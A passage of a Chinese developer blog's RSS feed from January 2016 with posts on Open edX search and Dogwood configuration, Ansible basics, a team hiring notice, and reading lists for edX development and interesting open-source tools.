&lt;h3&gt;分析源码&lt;/h3&gt;
&lt;h4&gt;类继承关系&lt;/h4&gt;
&lt;p&gt;waiting... 具体的源码分析留到之后有时间再折腾。今天大体上已经将search服务干净地分离出来了，据此可以做许多有趣的东西&lt;/p&gt;
&lt;h3&gt;Elasticsearch&lt;/h3&gt;
&lt;p&gt;Elasticsearch 是一个分布式可扩展的实时搜索和分析引擎。它能帮助你搜索、分析和浏览数据。edx中的相关搜索都是基于它写的&lt;/p&gt;
&lt;h4&gt;资源&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://es.xiaoleilu.com/"&gt;Elasticsearch 权威指南（中文版）&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.learnes.net/getting_started/README.html"&gt;Elasticsearch 权威指南&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.justinablog.com/archives/967"&gt;使用Python进行Elasticsearch数据索引&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 20 Jan 2016 00:00:00 +0000</pubDate><guid>tag:,2016-01-20:edx-search-analysis.html</guid><category>edx</category></item><item><title>招兵买马</title><link>/join-us.html</link><description>&lt;p&gt;ps: 最近来了好几封邮件，多谢大家厚爱。目前我们已经招到人啦，这个招聘暂时不生效呢。之后有好玩的东西再找大家一起折腾&lt;/p&gt;
&lt;p&gt;从没写过招聘，并不知道格式如何，先打油一把&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;如果你热爱互联网，同时又热爱教育  &lt;/p&gt;
&lt;p&gt;你码完代码，可能还想码诗&lt;/p&gt;
&lt;p&gt;你厌倦了雾霾，想找个厚重却不失情趣的城市&lt;/p&gt;
&lt;p&gt;你春初的周末醒来，想到钟山景区芳草如织&lt;/p&gt;
&lt;p&gt;你讨厌加班熬夜，还讨厌产品经理&lt;/p&gt;
&lt;p&gt;想过当木匠、作家，又舍不得离开代码  &lt;/p&gt;
&lt;p&gt;也许你并不是一个人，也许只是你还没有加入我们&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;打油完毕，该正经写招聘了&lt;/p&gt;
&lt;h1&gt;Web后端攻城狮&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;熟悉Python(Django)&lt;/li&gt;
&lt;li&gt;熟悉Linux(Ubuntu)&lt;/li&gt;
&lt;li&gt;熟悉Git&lt;/li&gt;
&lt;li&gt;如果有过参与开源项目的经验就更好啦&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;哦对了我们一般用Tmux/Vim/IPython来做开发，当然你也可以用Pycharm啦&lt;/p&gt;
&lt;p&gt;如果你有更多的技能和这里匹配：&lt;a href="http://blog.just4fun.site/open-edx-dev-skill-and-resource.html"&gt;Open edX开发技能与入门资料&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;还不快到碗里来233&lt;/p&gt;
&lt;h1&gt;前端攻城狮 (暂时不需要啦，有兴趣的小伙伴可以保持联系)&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;全职&lt;/li&gt;
&lt;li&gt;精通 HTML/CSS/JavaScript&lt;/li&gt;
&lt;li&gt;熟悉html5/jQuery/Ajax&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;熟悉以下技术的小伙伴优先(不强求)&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;前端工程化&lt;/li&gt;
&lt;li&gt;Backbone.js&lt;/li&gt;
&lt;li&gt;npm/Bower/Grunt&lt;/li&gt;
&lt;li&gt;RequireJS&lt;/li&gt;
&lt;li&gt;Bootstrap&lt;/li&gt;
&lt;li&gt;Sass&lt;/li&gt;
&lt;li&gt;React/Vue&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;如果你爱折腾爱技术，请无视以上所有要求，直接发简历吧~~&lt;/h3&gt;
&lt;h1&gt;联系方式&lt;/h1&gt;
&lt;p&gt;我们坐标南京，想用技术改变教育：）&lt;/p&gt;
&lt;p&gt;简历发送至 &lt;a href="&amp;#109;&amp;#97;&amp;#105;&amp;#108;&amp;#116;&amp;#111;&amp;#58;&amp;#119;&amp;#117;&amp;#119;&amp;#101;&amp;#110;&amp;#106;&amp;#105;&amp;#101;&amp;#55;&amp;#49;&amp;#56;&amp;#64;&amp;#103;&amp;#109;&amp;#97;&amp;#105;&amp;#108;&amp;#46;&amp;#99;&amp;#111;&amp;#109;"&gt;&amp;#119;&amp;#117;&amp;#119;&amp;#101;&amp;#110;&amp;#106;&amp;#105;&amp;#101;&amp;#55;&amp;#49;&amp;#56;&amp;#64;&amp;#103;&amp;#109;&amp;#97;&amp;#105;&amp;#108;&amp;#46;&amp;#99;&amp;#111;&amp;#109;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;如果有github和博客，也一并附上吧&lt;/p&gt;
&lt;p&gt;哦对了 我们接受实习 ：）&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sat, 16 Jan 2016 00:00:00 +0000</pubDate><guid>tag:,2016-01-16:join-us.html</guid><category>edx</category></item><item><title>ansible使用笔记</title><link>/ansible-note.html</link><description>&lt;p&gt;手头的服务器越来越多，下决心好好学学ansible了&lt;/p&gt;
&lt;h1&gt;本机安装&lt;/h1&gt;
&lt;p&gt;使用本地机器（mac）作为控制端&lt;/p&gt;
&lt;p&gt;pip install ansible&lt;/p&gt;
&lt;h1&gt;加入被控机器&lt;/h1&gt;
&lt;p&gt;以青云上的两台服务器为例(ubuntu12.04 64bit)，地址分别为:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;209.9.106.126 (insight)&lt;/li&gt;
&lt;li&gt;207.226.143.91 (cypress)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;以及内网的一台机器：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;10.10.100.114 (gogs)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;vim Inventory&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;[insight]&lt;/span&gt;
&lt;span class="na"&gt;insight 209.9.106.126 ansible_connection&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;ssh  ansible_ssh_user=ubuntu&lt;/span&gt;

&lt;span class="k"&gt;[cypress]&lt;/span&gt;
&lt;span class="na"&gt;cypress 207.226.143.91  ansible_connection&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;ssh  ansible_ssh_user=ubuntu&lt;/span&gt;

&lt;span class="k"&gt;[gogs]&lt;/span&gt;
&lt;span class="na"&gt;10.10.100.114 ansible_connection&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;ssh  ansible_ssh_user=ubuntu&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;ssh免密码配置&lt;/h3&gt;
&lt;p&gt;最简单的方式是：&lt;code&gt;ssh-copy-id -i ~/.ssh/id_rsa.pub 209.9.106.126&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;跑跑看&lt;/h3&gt;
&lt;p&gt;ansible -i Inventory  all -m ping (以下为输出)&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;insight | SUCCESS =&amp;gt; {
    &amp;quot;changed&amp;quot;: false,
    &amp;quot;ping&amp;quot;: &amp;quot;pong&amp;quot;
}
cypress | SUCCESS =&amp;gt; {
    &amp;quot;changed&amp;quot;: false,
    &amp;quot;ping&amp;quot;: &amp;quot;pong&amp;quot;
}
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;默认配置&lt;/h1&gt;
&lt;p&gt;vim ~/.ansible.cfg&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# .ansible.cfg&lt;/span&gt;
&lt;span class="k"&gt;[defaults]&lt;/span&gt;
&lt;span class="na"&gt;hostfile&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;~/ansible_workplace/Inventory&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;之后就可以不用-i了&lt;/p&gt;
&lt;h3&gt;给受控机器添加SSH authorized key&lt;/h3&gt;
&lt;p&gt;批量配置authorized key的话，使用核心模块&lt;a href="http://docs.ansible.com/ansible/authorized_key_module.html"&gt;authorized_key_module&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ansible -i Inventory insight -m authorized_key -a "user=ubuntu key=https://github.com/wwj718.keys"  #使用核心模块-m authorized_key，使用Ad-hoc（快速运行）&lt;/p&gt;
&lt;h1&gt;随便做些探索&lt;/h1&gt;
&lt;p&gt;ansible  cypress -a "ls ~"
ansible  insight -a "ls ~"
ansible  all -a "ls ~"&lt;/p&gt;
&lt;h3&gt;copy file（local =&amp;gt; remote）&lt;/h3&gt;
&lt;p&gt;echo "#hello ansible copy" &amp;gt; /tmp/hello.py 
ansible  all -m copy -a "src=/tmp/hello.py dest=/tmp"
ansible  all -a "cat /tmp/hello.py"&lt;/p&gt;
&lt;p&gt;以下为输出：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;cypress | SUCCESS | rc=0 &amp;gt;&amp;gt;
#hello ansible copy

insight | SUCCESS | rc=0 &amp;gt;&amp;gt;
#hello ansible copy
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;安装软件包&lt;/h3&gt;
&lt;p&gt;ansible gogs -m apt -a 'name=nethogs' -u wwj718  --sudo -K&lt;/p&gt;
&lt;h1&gt;资源&lt;/h1&gt;
&lt;h1&gt;参考资料&lt;/h1&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 14 Jan 2016 00:00:00 +0000</pubDate><guid>tag:,2016-01-14:ansible-note.html</guid><category>dev-tools</category></item><item><title>Open edX开发技能与入门资料</title><link>/open-edx-dev-skill-and-resource.html</link><description>&lt;p&gt;上周末应@COVER老师邀请，去了趟华中师范大学，和@徐潇@treasure@liuyuantao 及其他几个小伙伴，讨论了些Open edX相关的技术话题，关于Open edX架构、源码结构、源码阅读建议、开发及工作流建议、遇到的坑及解决思路相关的问题&lt;/p&gt;
&lt;p&gt;由于我们踩过的坑比较多，分享完前车之鉴，大家希望我分享些源码阅读经验和入门资料，我说我最近正好在思考这个问题，回去写成博客好啦，所以有下边这篇文章&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;哈哈上边的总结未免官方，我真正想说的是作为一个能吃辣地南方人，武汉的菜很合我胃口呀 ：） 与大家相处的周末很开心，像回到一年多以前，在学校里与一群热爱技术的小伙伴在一起的感觉&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;@MT在前些日子写过一篇&lt;a href="http://edustack.org/2015/12/14/open-edx%E6%B6%89%E5%8F%8A%E7%9A%84%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80%E3%80%81%E6%A1%86%E6%9E%B6%E5%92%8C%E5%BC%80%E6%BA%90%E7%BB%84%E4%BB%B6/"&gt;Open edX涉及的开发语言、框架和开源组件
&lt;/a&gt;，整理得很全了，对整个技术栈有兴趣的小伙伴，可以看那篇&lt;/p&gt;
&lt;p&gt;哦对了，招聘要求往往也是很不错的技能风向标，所以&lt;a href="http://www.xuetangx.com/"&gt;学堂在线&lt;/a&gt;的&lt;a href="http://www.xuetangx.com/about#join_us"&gt;招兵买马&lt;/a&gt;当然也是很好的参考啦&lt;/p&gt;
&lt;p&gt;我在这里主要整理我认为开发Open edX主要涉及的技术以及我自己比较喜欢的入门书籍,以及其他一些我的个人建议，分以下几个部分&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通用技能&lt;/li&gt;
&lt;li&gt;后端技能&lt;/li&gt;
&lt;li&gt;前端技能&lt;/li&gt;
&lt;li&gt;运维技能&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;通用技能&lt;/h1&gt;
&lt;h3&gt;Git&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;建议&lt;/code&gt;：团队中应当至少有一人熟练使用Git，这样能省下大量的时间。如果不能熟练使用Git，那么团队的协作将举步维艰，大多可以通过版本管理轻松解决的问题，将变为手工操作，效率极大地下降。当然也不要求所有人都精通Git，大多成员只要会最基本的操作就行，对于新手，SourceTree是十分不错的工具&lt;/p&gt;
&lt;p&gt;推荐资料：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;入门教程：  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://rogerdudler.github.io/git-guide/index.zh.html"&gt;git - 简明指南&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/Mark24Code/15minGit/blob/master/15minGit.md"&gt;15分钟学会使用Git&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;深入学习&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000"&gt;Git教程 廖雪峰&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://backlogtool.com/git-guide/cn/intro/intro1_1.html"&gt;猴子都能懂的GIT入门&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://zhengkun.info/2014/10/09/git_usage.html"&gt;Git 常用命令用法：程序员的场景&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;终极教程：    &lt;ul&gt;
&lt;li&gt;&lt;a href="https://git-scm.com/book/zh/v2"&gt;Pro Git&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;后端技能&lt;/h1&gt;
&lt;h3&gt;Linux(Ubuntu)&lt;/h3&gt;
&lt;p&gt;推荐几个特别有用的工具：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;tmux&lt;/li&gt;
&lt;li&gt;ssh&lt;/li&gt;
&lt;li&gt;IPython&lt;/li&gt;
&lt;li&gt;sshuttle&lt;/li&gt;
&lt;li&gt;ngrok&lt;/li&gt;
&lt;li&gt;htop&lt;/li&gt;
&lt;li&gt;nethogs&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;推荐资料：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://billie66.github.io/TLCL/book/zh/"&gt;The Linux Command Line &lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://linuxtools-rst.readthedocs.org/zh_CN/latest/index.html"&gt;Linux工具快速教程&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/jlevy/the-art-of-command-line/blob/master/README-zh.md"&gt;命令行的艺术&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://man.linuxde.net/"&gt;Linux命令大全&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Python&lt;/h3&gt;
&lt;p&gt;推荐资料：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Head First Programming&lt;/li&gt;
&lt;li&gt;&lt;a href="http://book.douban.com/subject/3988517/"&gt;Learning Python&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://old.sebug.net/paper/books/LearnPythonTheHardWay/"&gt;笨办法学 Python&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Python简明教程&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.pythondoc.com/pythontutorial27/index.html"&gt;Python 2.7 官方教程&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;进阶：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://python3-cookbook.readthedocs.org/zh_CN/latest/"&gt;Python Cookbook&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://book.douban.com/subject/26389274/"&gt;Python高手之路&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Django&lt;/h3&gt;
&lt;p&gt;我自己的入门资料是&lt;a href="http://djangobook.py3k.cn/2.0/"&gt;djangobook&lt;/a&gt;,十分喜欢这本书，往复翻了有好几遍。此外的建议是边看书，边去github上找些小项目跟着做，写个小博客就是很好的练手项目&lt;/p&gt;
&lt;p&gt;推荐资料：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://djangobook.py3k.cn/2.0/"&gt;djangobook&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/yangyubo/zh-django-best-practices"&gt;Django 最佳实践&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://python.usyiyi.cn/django/index.html"&gt;Django 1.8.2 文档中文版 &lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.gitbook.com/book/andrew-liu/django-blog/details"&gt;Django搭建简易博客教程&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Mako&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://docs.makotemplates.org/en/latest/"&gt;http://docs.makotemplates.org/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.yeolar.com/note/2012/08/28/mako-syntax/"&gt;Python模板库Mako的语法&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;数据库&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Mysql&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.cnblogs.com/mr-wid/archive/2013/05/09/3068229.html"&gt;21分钟 MySQL 入门教程&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;MongoDB&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/justinyhuang/the-little-mongodb-book-cn/blob/master/mongodb.md"&gt;The Little MongoDB Book&lt;/a&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;可选：Docker&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=""&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Todo&lt;/h1&gt;
&lt;h1&gt;前端技能&lt;/h1&gt;
&lt;p&gt;HTML、CSS、Javascript(jQuery)当然是必备的&lt;/p&gt;
&lt;h3&gt;调试工具&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://jinlong.github.io/2013/08/29/devtoolsecrets/"&gt;浏览器开发工具的秘密&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/CN-Chrome-DevTools/CN-Chrome-DevTools/blob/master/directory.md"&gt;Chrome DevTools&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Backbone.js&lt;/h3&gt;
&lt;h3&gt;Require.js&lt;/h3&gt;
&lt;h3&gt;Sass&lt;/h3&gt;
&lt;h1&gt;运维技能&lt;/h1&gt;
&lt;h3&gt;Linux(Ubuntu)&lt;/h3&gt;
&lt;h1&gt;&lt;/h1&gt;
&lt;h2&gt;Nginx&lt;/h2&gt;
&lt;h3&gt;Ansible&lt;/h3&gt;
&lt;h1&gt;附录&lt;/h1&gt;
&lt;h3&gt;vim&lt;/h3&gt;
&lt;p&gt;我日常使用vim作为编辑器，如果你想学习vim，推荐这篇文章&lt;a href="http://coolshell.cn/articles/5426.html"&gt;简明 Vim 练级攻略&lt;/a&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Mon, 11 Jan 2016 00:00:00 +0000</pubDate><guid>tag:,2016-01-11:open-edx-dev-skill-and-resource.html</guid><category>edx</category></item><item><title>一些有趣的项目</title><link>/something-geek-and-interesting.html</link><description>&lt;h1&gt;目的&lt;/h1&gt;
&lt;p&gt;share something  interesting and geek&lt;/p&gt;
&lt;h1&gt;Todo&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;截图&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;&lt;a href="https://github.com/MycroftAI/adapt"&gt;adapt&lt;/a&gt;&lt;/h1&gt;
&lt;p&gt;&lt;a href="http://news.softpedia.com/news/mycroft-releases-key-ai-component-as-open-source-498567.shtml"&gt;Mycroft Releases Key AI Component as Open Source&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;&lt;a href="https://github.com/unbug/codelf"&gt;codelf&lt;/a&gt;&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Search over projects from Github, Bitbucket, Google Code, Codeplex, Sourceforge, Fedora Project to find real-world usage variable names &lt;a href="http://unbug.github.io/codelf/"&gt;http://unbug.github.io/codelf/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;计算机科学里两件最难的事：缓存失效和命名。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Codelf试图去解决命名的问题.支持直接搜索中文。&lt;/p&gt;
&lt;h1&gt;&lt;a href="https://github.com/zolrath/wemux"&gt;wemux&lt;/a&gt;&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;wemux enhances tmux to make multi-user terminal multiplexing both easier and more powerful. It allows users to host a wemux server and have clients join in&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;&lt;a href="https://github.com/amoffat/snake"&gt;snake&lt;/a&gt;&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Snake lets you use Python to its fullest extent to write Vim plugins&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;&lt;a href="https://github.com/google/yapf"&gt;yapf&lt;/a&gt;&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;A formatter for Python files&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;&lt;a href="https://github.com/bordaigorl/sublime-evernote"&gt;sublime-evernote&lt;/a&gt;&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Evernote for Sublime Text&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;&lt;a href="https://github.com/jonathanslenders/ptpython"&gt;ptpython&lt;/a&gt;&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;A better Python REPL&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;if you love ipython ,use &lt;code&gt;ptipython&lt;/code&gt;.if you love vim ,please use F4 to use VI mode&lt;/p&gt;
&lt;h1&gt;&lt;a href="https://github.com/dbcli/mycli"&gt;mycli&lt;/a&gt;&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;A Terminal Client for MySQL with AutoCompletion and Syntax Highlighting.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;&lt;a href="https://github.com/docker/dockercraft"&gt;dockercraft&lt;/a&gt;&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;A simple Minecraft Docker client, to visualize and manage Docker containers.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;&lt;a href="https://github.com/syl20bnr/spacemacs"&gt;spacemacs&lt;/a&gt;&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;A community-driven Emacs distribution - The best editor is neither Emacs nor Vim, it's Emacs &lt;em&gt;and&lt;/em&gt; Vim&lt;/p&gt;
&lt;/blockquote&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Mon, 11 Jan 2016 00:00:00 +0000</pubDate><guid>tag:,2016-01-11:something-geek-and-interesting.html</guid><category>dev-tools</category></item><item><title>edx Dogwood基础配置</title><link>/Dogwood-setting.html</link><description>&lt;h1&gt;Todo&lt;/h1&gt;
&lt;p&gt;所有用手动修改的地方改为sed修改，使其命令化&lt;/p&gt;
&lt;h1&gt;新特性配置&lt;/h1&gt;
&lt;p&gt;关于新特性的配置请移步&lt;a href="http://blog.just4fun.site/try-open-edx-master-20151214.html"&gt;Open edX最新版评测与新特性探索(20151214)&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;预备知识&lt;/h1&gt;
&lt;p&gt;配置文件在&lt;code&gt;/edx/app/edxapp&lt;/code&gt;目录，有四个配置文件：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;lms.env.json&lt;/li&gt;
&lt;li&gt;cms.env.json&lt;/li&gt;
&lt;li&gt;lms.auth.json&lt;/li&gt;
&lt;li&gt;cms.auth.json&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;汉化&lt;/h1&gt;
&lt;h3&gt;修改配置文件&lt;/h3&gt;
&lt;p&gt;修改*ms.env.json中的LANGUAGE_CODE,将en改为&lt;code&gt;zh_CN&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;获取汉化包&lt;/h3&gt;
&lt;p&gt;Dogwood的汉化包还没有出来。
我们暂时适应@MT的&lt;a href="http://edustack.org/2015/10/26/open-edx-cypress%E5%AE%8C%E6%95%B4%E6%B1%89%E5%8C%96%E8%AF%AD%E8%A8%80%E5%8C%85/"&gt;Open edX Cypress完整汉化语言包&lt;/a&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo -u edxapp bash
&lt;span class="nb"&gt;source&lt;/span&gt; /edx/app/edxapp/edxapp_env
&lt;span class="nb"&gt;cd&lt;/span&gt; /edx/app/edxapp/edx-platform/conf/locale/zh_CN/LC_MESSAGES/
rm *
wget http://mirrors.edustack.org/LC_MESSAGES/django.po
wget http://mirrors.edustack.org/LC_MESSAGES/djangojs.po
&lt;span class="nb"&gt;cd&lt;/span&gt; /edx/app/edxapp/edx-platform
paver i18n_fastgenerate
sudo /edx/bin/supervisorctl restart edxapp:
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;配置邮件服务&lt;/h1&gt;
&lt;p&gt;邮件配置和此前的版本没有变化，通过修改/edx/app/edxapp/目录下的json文件&lt;/p&gt;
&lt;h1&gt;Logo修改与主题定制&lt;/h1&gt;
&lt;p&gt;Dogwood已经把主题内置到源码里了，此前的&lt;a href="https://github.com/edx/edx-platform/wiki/Stanford-Theming"&gt;https://github.com/edx/edx-platform/wiki/Stanford-Theming&lt;/a&gt;和&lt;a href="https://github.com/IONISx/edx-theme"&gt;IONISx/edx-theme&lt;/a&gt;都不适用了（可以通过修改来补救），大家注意一下&lt;/p&gt;
&lt;p&gt;文档参考&lt;a href="https://github.com/edx/edx-platform/tree/master/themes"&gt;Comprehensive Theming&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;修改lms.env.json中的COMPREHENSIVE_THEME_DIR,指向主题所在目录&lt;/p&gt;
&lt;p&gt;Dogwood中带了几个demo主题。我们给个demo：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;"COMPREHENSIVE_THEME_DIR": "/edx/app/edxapp/edx-platform/themes/edx.org"&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;然后编译静态文件&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo -H -u edxapp bash
&lt;span class="nb"&gt;source&lt;/span&gt; /edx/app/edxapp/edxapp_env
&lt;span class="nb"&gt;cd&lt;/span&gt; /edx/app/edxapp/edx-platform
paver update_assets cms --settings&lt;span class="o"&gt;=&lt;/span&gt;aws
&lt;span class="c1"&gt;#paver update_assets lms --settings=aws&lt;/span&gt;
paver update_assets lms --settings&lt;span class="o"&gt;=&lt;/span&gt;devstack
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;修改站点信息&lt;/h1&gt;
&lt;h3&gt;网站名&lt;/h3&gt;
&lt;p&gt;修改*ms.env.json中的PLATFORM_NAME&lt;/p&gt;
&lt;h3&gt;时区&lt;/h3&gt;
&lt;p&gt;修改*ms.env.json中的TIME_ZONE，使其为&lt;code&gt;Asia/Shanghai&lt;/code&gt;&lt;/p&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://edustack.org/manual/edx/ova%E9%85%8D%E7%BD%AE%E6%8C%87%E5%8D%97/"&gt;Open edX » 简明配置指南&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/configuration/wiki/edX-Managing-the-Full-Stack"&gt;edX Managing the Full Stack&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 07 Jan 2016 00:00:00 +0000</pubDate><guid>tag:,2016-01-07:Dogwood-setting.html</guid><category>edx</category></item><item><title>Open edX，开放教育与许可协议</title><link>/about-creative-commons.html</link><description>&lt;h1&gt;年度事件&lt;/h1&gt;
&lt;p&gt;在&lt;a href="https://opensource.com/life/15/12/best-open-source-news-2015"&gt;Top news of 2015 in open source&lt;/a&gt;(2015年开源年度新闻)里提到&lt;code&gt;开放教育为未来做好准备&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;原文如下&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Open education ready for the future&lt;/p&gt;
&lt;p&gt;This year, Open edX added Creative Commons licensing to their content, and Creative Commons sent an open letter to the Obama administration calling for administrative action to ensure that federally funded educational materials are made available as Open Educational Resources for the public.&lt;/p&gt;
&lt;/blockquote&gt;
